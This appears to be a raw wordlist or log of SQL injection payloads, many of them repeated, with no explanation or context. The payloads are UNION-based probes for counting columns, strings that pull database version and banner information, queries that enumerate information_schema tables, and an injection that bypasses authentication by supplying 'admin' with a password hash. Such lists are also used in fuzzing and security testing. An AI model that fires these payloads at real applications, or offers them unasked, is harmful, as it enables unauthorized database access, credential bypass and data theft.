+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+ select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-3667%'   )    )    union all select 3560,3560,3560--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-4869%' union all select 5729,5729,5729--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+ select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'
+ )   union select * from information_schema.tables,
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+ select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1
+-3638" union all select 4394,4394,4394,4394,4394,4394,4394--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--
+ )   union select * from information_schema.tables,
+-2314%'   )    )    union all select 4612,4612--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-3667%'   )    )    union all select 3560,3560,3560--
+ select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+ select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-3017"   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--
+-3667%'   )    )    union all select 3560,3560,3560--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+ select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-3667%'   )    )    union all select 3560,3560,3560--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-3667%'   )    )    union all select 3560,3560,3560--
+-3667%'   )    )    union all select 3560,3560,3560--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+ )   union select * from information_schema.tables,
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
